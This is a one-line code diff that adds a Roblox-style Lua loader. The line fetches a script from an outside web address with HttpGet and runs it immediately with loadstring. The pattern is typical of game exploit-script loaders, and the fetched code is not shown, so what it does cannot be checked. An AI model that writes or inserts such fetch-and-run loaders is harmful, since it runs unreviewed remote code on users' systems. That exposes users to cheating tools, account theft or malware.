@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://solene-348b0860.base44.app/functions/getRawScript?id=6a806cf77c97d32a417abf96"))()
